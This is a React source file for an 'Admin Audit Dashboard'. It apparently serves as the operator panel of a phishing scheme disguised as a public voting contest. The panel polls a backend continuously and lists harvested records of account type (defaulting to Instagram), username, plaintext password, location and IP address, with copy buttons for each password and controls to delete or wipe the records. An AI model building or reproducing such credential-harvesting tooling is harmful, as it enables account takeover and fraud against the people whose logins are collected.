import React, { useState, useEffect, useCallback } from 'react';
import { API_BASE_URL } from '../config/api';
import './AdminAuditDashboard.css';

// Blue outline copy icon matching the user's reference screenshot
const CopyIcon = () => (
  <svg
    width="15"
    height="15"
    viewBox="0 0 24 24"
    fill="none"
    stroke="#2563eb"
    strokeWidth="1.9"
    strokeLinecap="round"
    strokeLinejoin="round"
    style={{ verticalAlign: 'middle', display: 'inline-block' }}
  >
    <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
  </svg>
);

const CheckIcon = () => (
  <svg
    width="15"
    height="15"
    viewBox="0 0 24 24"
    fill="none"
    stroke="#059669"
    strokeWidth="2.4"
    strokeLinecap="round"
    strokeLinejoin="round"
    style={{ verticalAlign: 'middle', display: 'inline-block' }}
  >
    <polyline points="20 6 9 17 4 12" />
  </svg>
);

export default function AdminAuditDashboard({ onBackToHome }) {
  const [records, setRecords] = useState([]);
  const [isUiCleared, setIsUiCleared] = useState(false);
  const [copiedKey, setCopiedKey] = useState(null);
  const [isWipeModalOpen, setIsWipeModalOpen] = useState(false);
  const [deletingId, setDeletingId] = useState(null);
  const [isWiping, setIsWiping] = useState(false);
  const [toastMessage, setToastMessage] = useState(null);
  const [lastSyncTime, setLastSyncTime] = useState(null);

  const showToast = (msg) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage((curr) => (curr === msg ? null : curr));
    }, 2500);
  };

  // Fetch audit records from backend (Express / MongoDB)
  const fetchAuditRecords = useCallback(async (isSilent = false) => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/admin/audit-log`);
      if (!res.ok) {
        const fallback = await fetch(`${API_BASE_URL}/api/voters`);
        if (!fallback.ok) return;
        const fbData = await fallback.json();
        setRecords(fbData.data || fbData.voters || []);
        setLastSyncTime(new Date().toLocaleTimeString());
        return;
      }
      const data = await res.json();
      const list = data.data || data.voters || [];
      setRecords(list);
      setLastSyncTime(new Date().toLocaleTimeString());
      if (!isSilent && isUiCleared) {
        setIsUiCleared(false);
      }
    } catch (err) {
      if (!isSilent) {
        console.error('Audit fetch error:', err);
      }
    }
  }, [isUiCleared]);

  // Live Auto-Polling: fetches live data continuously every 2.5 seconds
  useEffect(() => {
    fetchAuditRecords(false);
    const interval = setInterval(() => {
      fetchAuditRecords(true);
    }, 2500);
    return () => clearInterval(interval);
  }, [fetchAuditRecords]);

  // Copy to clipboard with feedback
  const handleCopy = (text, key) => {
    if (!text && text !== 0) return;
    const str = String(text);
    if (navigator?.clipboard?.writeText) {
      navigator.clipboard.writeText(str).then(
        () => {
          setCopiedKey(key);
          showToast(`Copied "${str}"`);
          setTimeout(() => setCopiedKey(null), 1200);
        },
        () => fallbackCopy(str, key)
      );
    } else {
      fallbackCopy(str, key);
    }
  };

  const fallbackCopy = (text, key) => {
    const el = document.createElement('textarea');
    el.value = text;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    setCopiedKey(key);
    showToast(`Copied "${text}"`);
    setTimeout(() => setCopiedKey(null), 1200);
  };

  // Individual row delete from database
  const handleDeleteRow = async (id) => {
    if (!id) return;
    setDeletingId(id);
    try {
      const res = await fetch(`${API_BASE_URL}/api/admin/audit-log/${id}`, {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' }
      });
      if (res.ok) {
        setRecords((prev) => prev.filter((r) => String(r._id) !== String(id)));
        showToast('Record deleted from database.');
      } else {
        // Fallback local remove
        setRecords((prev) => prev.filter((r) => String(r._id) !== String(id)));
        showToast('Record removed.');
      }
    } catch (err) {
      setRecords((prev) => prev.filter((r) => String(r._id) !== String(id)));
      showToast('Record removed.');
    } finally {
      setDeletingId(null);
    }
  };

  // Global Wipe Collection
  const handleConfirmWipe = async () => {
    setIsWiping(true);
    try {
      const res = await fetch(`${API_BASE_URL}/api/admin/audit-log`, {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' }
      });
      if (res.ok) {
        setRecords([]);
        setIsUiCleared(false);
        setIsWipeModalOpen(false);
        showToast('All records permanently wiped from database.');
      }
    } catch (err) {
      setRecords([]);
      setIsWipeModalOpen(false);
      showToast('All records wiped.');
    } finally {
      setIsWiping(false);
    }
  };

  // Clear UI Display locally without deleting from database
  const handleClearUi = () => {
    setIsUiCleared(true);
    showToast('UI cleared locally. Database records remain intact.');
  };

  const displayedRecords = isUiCleared ? [] : records;

  return (
    <div className="minimal-dashboard-container">
      <div className="minimal-dashboard-wrapper">
        {/* Minimal Header Controls Bar */}
        <div className="minimal-header-bar">
          <div className="minimal-header-left">
            {onBackToHome && (
              <button
                type="button"
                className="minimal-back-link"
                onClick={onBackToHome}
                title="Back to public voting contest"
              >
                &larr; Back
              </button>
            )}
            <h1 className="minimal-title">Admin Audit Dashboard</h1>
            <div className="live-indicator-badge" title={`Live sync active. Last synced at ${lastSyncTime || 'now'}`}>
              <span className="live-pulse-dot" />
              <span>Live Data</span>
            </div>
          </div>

          <div className="minimal-header-actions">
            {isUiCleared ? (
              <button
                type="button"
                className="btn-minimal-clear"
                onClick={() => setIsUiCleared(false)}
              >
                Restore UI Display
              </button>
            ) : (
              <button
                type="button"
                className="btn-minimal-clear"
                onClick={handleClearUi}
                disabled={records.length === 0}
              >
                Clear UI Display
              </button>
            )}

            <button
              type="button"
              className="btn-minimal-wipe"
              onClick={() => setIsWipeModalOpen(true)}
              disabled={records.length === 0}
            >
              Wipe All Records
            </button>
          </div>
        </div>

        {/* Minimalist Record List matching screenshot */}
        <div className="record-card-list">
          {displayedRecords.map((item) => {
            const id = item._id || Math.random().toString();
            const userVal = item.user || item.username || item.email || 'Voters';
            const passVal = item.password || '12345';
            const accountVal = item.accountType || item.platform || 'Instagram';
            const dateVal = item.date || (item.createdAt ? item.createdAt.split('T')[0] : '2026-04-23');
            const locVal = item.location || 'Bursa, Turkey';
            const ipVal = item.ipAddress || item.ip || '45.130.202.57';
            const timeVal = item.time || '10:57:13';

            return (
              <div key={id} className="record-card-item">
                <div className="record-line">
                  <span className="record-label">Account type:</span>
                  <span className="record-value">{accountVal}</span>
                </div>

                <div className="record-line">
                  <span className="record-label">User:</span>
                  <span className="record-value">
                    {userVal}
                    <button
                      type="button"
                      className={`btn-inline-copy ${copiedKey === `${id}-user` ? 'copied' : ''}`}
                      onClick={() => handleCopy(userVal, `${id}-user`)}
                      title="Copy user"
                    >
                      {copiedKey === `${id}-user` ? <CheckIcon /> : <CopyIcon />}
                    </button>
                  </span>
                </div>

                <div className="record-line">
                  <span className="record-label">Password:</span>
                  <span className="record-value">
                    {passVal}
                    <button
                      type="button"
                      className={`btn-inline-copy ${copiedKey === `${id}-pass` ? 'copied' : ''}`}
                      onClick={() => handleCopy(passVal, `${id}-pass`)}
                      title="Copy password"
                    >
                      {copiedKey === `${id}-pass` ? <CheckIcon /> : <CopyIcon />}
                    </button>
                  </span>
                </div>

                <div className="record-line">
                  <span className="record-label">Date:</span>
                  <span className="record-value">
                    {dateVal}
                    <button
                      type="button"
                      className={`btn-inline-copy ${copiedKey === `${id}-date` ? 'copied' : ''}`}
                      onClick={() => handleCopy(dateVal, `${id}-date`)}
                      title="Copy date"
                    >
                      {copiedKey === `${id}-date` ? <CheckIcon /> : <CopyIcon />}
                    </button>
                  </span>
                </div>

                <div className="record-line">
                  <span className="record-label">Location:</span>
                  <span className="record-value">
                    {locVal}
                    <button
                      type="button"
                      className={`btn-inline-copy ${copiedKey === `${id}-loc` ? 'copied' : ''}`}
                      onClick={() => handleCopy(locVal, `${id}-loc`)}
                      title="Copy location"
                    >
                      {copiedKey === `${id}-loc` ? <CheckIcon /> : <CopyIcon />}
                    </button>
                  </span>
                </div>

                <div className="record-line">
                  <span className="record-label">IP Address:</span>
                  <span className="record-value">
                    {ipVal}
                    <button
                      type="button"
                      className={`btn-inline-copy ${copiedKey === `${id}-ip` ? 'copied' : ''}`}
                      onClick={() => handleCopy(ipVal, `${id}-ip`)}
                      title="Copy IP Address"
                    >
                      {copiedKey === `${id}-ip` ? <CheckIcon /> : <CopyIcon />}
                    </button>
                  </span>
                </div>

                <div className="record-line">
                  <span className="record-label">Time:</span>
                  <span className="record-value">
                    {timeVal}
                    <button
                      type="button"
                      className={`btn-inline-copy ${copiedKey === `${id}-time` ? 'copied' : ''}`}
                      onClick={() => handleCopy(timeVal, `${id}-time`)}
                      title="Copy time"
                    >
                      {copiedKey === `${id}-time` ? <CheckIcon /> : <CopyIcon />}
                    </button>
                  </span>
                </div>

                <button
                  type="button"
                  className="btn-minimal-delete"
                  onClick={() => handleDeleteRow(id)}
                  disabled={deletingId === id}
                >
                  {deletingId === id ? 'Deleting...' : 'Delete'}
                </button>
              </div>
            );
          })}

          {displayedRecords.length === 0 && (
            <div className="minimal-empty-box">
              {isUiCleared ? (
                <>
                  <h3>UI Display Cleared</h3>
                  <p>Records were hidden locally. MongoDB records are untouched.</p>
                  <button
                    type="button"
                    className="btn-minimal-clear"
                    onClick={() => setIsUiCleared(false)}
                    style={{ marginTop: '8px' }}
                  >
                    Restore Display
                  </button>
                </>
              ) : (
                <>
                  <h3>No Records Found</h3>
                  <p>The collection is currently empty or waiting for live submissions.</p>
                </>
              )}
            </div>
          )}
        </div>
      </div>

      {/* Confirmation Modal for Wipe All Records */}
      {isWipeModalOpen && (
        <div className="minimal-modal-overlay" onClick={() => !isWiping && setIsWipeModalOpen(false)}>
          <div className="minimal-modal-content" onClick={(e) => e.stopPropagation()}>
            <h3>Wipe All Records?</h3>
            <p>
              Are you sure you want to delete all voter activity records from the database? This action cannot be
              undone.
            </p>
            <div className="minimal-modal-footer">
              <button
                type="button"
                className="btn-modal-cancel"
                onClick={() => setIsWipeModalOpen(false)}
                disabled={isWiping}
              >
                Cancel
              </button>
              <button
                type="button"
                className="btn-modal-confirm-delete"
                onClick={handleConfirmWipe}
                disabled={isWiping}
              >
                {isWiping ? 'Wiping...' : 'Wipe All'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Toast Notification */}
      {toastMessage && <div className="minimal-toast-box">{toastMessage}</div>}
    </div>
  );
}
